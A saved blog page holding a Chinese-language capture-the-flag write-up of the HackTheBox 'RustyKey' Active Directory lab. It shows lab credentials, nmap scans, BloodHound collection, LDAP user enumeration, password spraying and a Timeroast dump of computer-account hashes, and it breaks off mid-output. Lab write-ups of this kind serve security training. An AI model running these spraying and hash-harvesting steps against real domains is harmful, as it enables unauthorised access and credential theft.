<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Season8 - RustyKey

 https://app.hackthebox.com/machines/RustyKey | `Windows` | `Hard`
 

Machine Information：As is common in real life Windows pentests, you will start the RustyKey box with credentia..." data-next-head=""/><meta property="og:title" content="HackTheBox - Season8 - RustyKey" data-next-head=""/><meta property="og:description" content="Season8 - RustyKey

 https://app.hackthebox.com/machines/RustyKey | `Windows` | `Hard`
 

Machine Information：As is common in real life Windows pentests, you will start the RustyKey box with credentia..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/06/30/HackTheBoxSeason8 - RustyKey" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-06-30" data-next-head=""/><meta property="article:modified_time" content="2025-06-30" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="HackTheBox" data-next-head=""/><meta property="article:tag" content="Windows" data-next-head=""/><meta property="article:tag" content="RBCD" data-next-head=""/><meta property="article:tag" content="COMhijack" data-next-head=""/><meta property="article:tag" content="TimeRoast" data-next-head=""/><meta property="article:tag" content="RunasCs" data-next-head=""/><meta property="article:tag" content="encrypt" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackTheBox - Season8 - RustyKey" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/06/30/HackTheBoxSeason8 - RustyKey" data-next-head=""/><title data-next-head="">HackTheBox - Season8 - RustyKey</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/b1513c3d3d6a31a1.css" as="style"/><link rel="stylesheet" href="/_next/static/css/b1513c3d3d6a31a1.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-08a5e9543ab19a3f.js" defer=""></script><script src="/_next/static/WrH-FXgOCOeF_S07eZ3xH/_buildManifest.js" defer=""></script><script src="/_next/static/WrH-FXgOCOeF_S07eZ3xH/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">HackTheBox - Season8 - RustyKey</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-06-30</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-06-30<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">HackTheBox</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Windows</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">RBCD</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">COMhijack</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">TimeRoast</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">RunasCs</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">encrypt</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - RustyKey","contentHtml":"\u003ch1\u003eSeason8 - RustyKey\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/RustyKey\"\u003ehttps://app.hackthebox.com/machines/RustyKey\u003c/a\u003e | \u003ccode\u003eWindows\u003c/code\u003e | \u003ccode\u003eHard\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eMachine Information：As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/wyyay.jpg\" alt=\"image.jpg\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey nmap -sT -min-rate 5000 -p- 10.10.11.75                      \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 12:48 CST\nWarning: 10.10.11.75 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.75\nHost is up (0.054s latency).\nNot shown: 43915 closed tcp ports (conn-refused), 21599 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49670/tcp open  unknown\n49672/tcp open  unknown\n49673/tcp open  unknown\n49676/tcp open  unknown\n49692/tcp open  unknown\n49737/tcp open  unknown\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey nmap -sT -A -p $(\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e port | awk -F \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003epaste\u003c/span\u003e -sd \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e) 10.10.11.75\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 12:54 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.75\nHost is up (0.34s latency).\n\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-06-29 12:32:13Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3269/tcp open  tcpwrapped\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp open  mc-nmf        .NET Message Framing\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 1903 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 7h37m27s\n| smb2-time: \n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-06-29T12:32:50\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   97.54 ms 10.10.16.1\n2   50.11 ms 10.10.11.75\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 64.90 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e机子中给了账户 \u003ccode\u003err.parker\u003c/code\u003e / \u003ccode\u003e8#t5HE8L!W3A\u003c/code\u003e ，测试一下凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey nxc ldap 10.10.11.75 -u \u003cspan class=\"hljs-string\"\u003e'rr.parker'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'8#t5HE8L!W3A'\u003c/span\u003e -d rustykey.htb -k\nLDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)\nLDAP        10.10.11.75     389    DC               [+] rustykey.htb\\rr.parker:8#t5HE8L!W3A \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e仅对\u003ccode\u003eLDAP\u003c/code\u003e有权限\u003c/p\u003e\n\u003ch2\u003e域分析\u003c/h2\u003e\n\u003cp\u003e有\u003ccode\u003eldap\u003c/code\u003e 权限就可以使用\u003ccode\u003ebloodhound-python\u003c/code\u003e来收集数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'rr.parker'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'8#t5HE8L!W3A'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'rustykey.htb'\u003c/span\u003e -ns 10.10.11.75 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC.rustykey.htb'\u003c/span\u003e --dns-tcp\nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: rustykey.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nINFO: Connecting to LDAP server: DC.rustykey.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 16 computers\nINFO: Connecting to LDAP server: DC.rustykey.htb\nINFO: Found 12 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 58 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 10 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: \nINFO: Querying computer: \nINFO: Querying computer: \nINFO: Querying computer: \nINFO: Querying computer: \nINFO: Querying computer: dc.rustykey.htb\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 01M 20S\nINFO: Compressing output into 20250629205022_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e诶？好像并没什么权限？\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看一下首先需要到哪一个用户\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eNN.MARCOS\u003c/code\u003e属于\u003ccode\u003eHELPDESK\u003c/code\u003e组，可以修改大多数用户密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eEE.REED\u003c/code\u003e属于远程管理组\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e属于远程管理组的用户有三个，不止\u003ccode\u003eEE.REED\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e密码喷洒\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey ldapsearch -x -H ldap://10.10.11.75 -D \u003cspan class=\"hljs-string\"\u003e'rr.parker@rustykey.htb'\u003c/span\u003e -w \u003cspan class=\"hljs-string\"\u003e'8#t5HE8L!W3A'\u003c/span\u003e -b \u003cspan class=\"hljs-string\"\u003e'dc=rustykey,dc=htb'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"(objectClass=user)\"\u003c/span\u003e userPrincipalName \u003e \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e \n➜  RustyKey \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e | grep userPrinci | awk \u003cspan class=\"hljs-string\"\u003e'{print $2}'\u003c/span\u003e | awk -F \u003cspan class=\"hljs-string\"\u003e'@'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e \u003e usersName.txt\n➜  RustyKey \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e usersName.txt \nrr.parker\nmm.turner\nbb.morgan\ngg.anderson\ndd.ali\nee.reed\nnn.marcos\nbackupadmin\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey nxc ldap 10.10.11.75 -u usersName.txt -p \u003cspan class=\"hljs-string\"\u003e'8#t5HE8L!W3A'\u003c/span\u003e -d rustykey.htb -k\nLDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\mm.turner:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\bb.morgan:8#t5HE8L!W3A KDC_ERR_ETYPE_NOSUPP\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\gg.anderson:8#t5HE8L!W3A KDC_ERR_CLIENT_REVOKED\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\dd.ali:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\ee.reed:8#t5HE8L!W3A KDC_ERR_ETYPE_NOSUPP\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\nn.marcos:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\backupadmin:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e无结果，感觉都被堵死了，难道还有其它的方法/路径？\u003c/p\u003e\n\u003ch2\u003eTimeroast\u003c/h2\u003e\n\u003cp\u003e经过佬的提示：可以对计算机账户进行破解\u003c/p\u003e\n\u003cp\u003e一脸懵比，经过搜索后找到工具 \u0026#x26; 文章：\u003ca href=\"https://github.com/SecuraBV/Timeroast\"\u003ehttps://github.com/SecuraBV/Timeroast\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003eTimeroasting\u003c/code\u003e 利用 \u003ccode\u003eWindows\u003c/code\u003e 的 NTP 身份验证机制，允许未经身份验证的攻击者通过使用该帐户的 RID 发送 NTP 请求来有效地请求任何计算机或信任帐户的密码哈希。当计算机帐户正确生成时，这不是问题，但如果设置了非标准或旧式默认密码，则此工具允许您暴力破解这些帐户。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Timeroast python timeroast.py 10.10.11.75                                                                   \n1000:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$2418f183f665f9a5c83dbfc11700a3ae\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51e099b8ae1b8428bffbfcd0aec0bd91dca11bd97ec0bd91dca11d6c2\u003c/span\u003e\n1103:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$c0e0c72854de182540c91d361623107d\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51f38db12e1b8428bffbfcd0aec0bd91dcb40fecdec0bd91dcb4112ef\u003c/span\u003e\n1104:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$e09ca666aade07ada24608bd83b9a2fb\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51f3b5540e1b8428bffbfcd0aec0bd91dcb43236bec0bd91dcb438d1d\u003c/span\u003e\n1105:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$6ec3c57beb28520e502cdee6446df19c\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51f4b00afe1b8428bffbfcd0aec0bd91dcb531f61ec0bd91dcb533be7\u003c/span\u003e\n1107:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$2f5f805027ce2b2d0bfcbc836ab42f5d\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51f68b41ee1b8428bffbfcd0aec0bd91dcb70d123ec0bd91dcb70ef56\u003c/span\u003e\n1106:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$cd000a53898617dc0cd973f8e839e5b1\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51f62611ee1b8428bffbfcd0aec0bd91dcb6a7e23ec0bd91dcb6a9aa8\u003c/span\u003e\n1118:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$ee054be4e17ee5b853370b2b5b40b675\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51f9f6662e1b8428bffbfcd0aec0bd91dcba78f25ec0bd91dcba79e3f\u003c/span\u003e\n1119:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$12da551d0e5f7178f7af75afbb0a5382\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51fa16b1fe1b8428bffbfcd0aec0bd91dcba98edaec0bd91dcba9a2fc\u003c/span\u003e\n1120:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$36a30fb572b815d843d201fe7a841968\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51fafc04ce1b8428bffbfcd0aec0bd91dcbb7dd51ec0bd91dcbb7fb84\u003c/span\u003e\n1121:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$92f012b2753ff95e71ce40ffd1078763\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51fba5fe2e1b8428bffbfcd0aec0bd91dcbc28042ec0bd91dcbc29b1a\u003c/span\u003e\n1122:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$9b7714752fee6064d12cb81b9d1667eb\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51fc14eeae1b8428bffbfcd0aec0bd91dcbc96befec0bd91dcbc98874\u003c/span\u003e\n1123:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$7b122d698ffd2f325bfac7e1ffc66d56\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51fcad652e1b8428bffbfcd0aec0bd91dcbd2e290ec0bd91dcbd31337\u003c/span\u003e\n1124:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$b1da6a31b1c0765e4aeed789f864c90b\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51fd282efe1b8428bffbfcd0aec0bd91dcbdaa4fcec0bd91dcbdabe27\u003c/span\u003e\n1125:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$64f2a3fd9d648406f005e257583840db\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51fd95571e1b8428bffbfcd0aec0bd91dcbe1792cec0bd91dcbe18efb\u003c/span\u003e\n1126:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$deecd5d1f4606005b181597046c46247\u003cspan 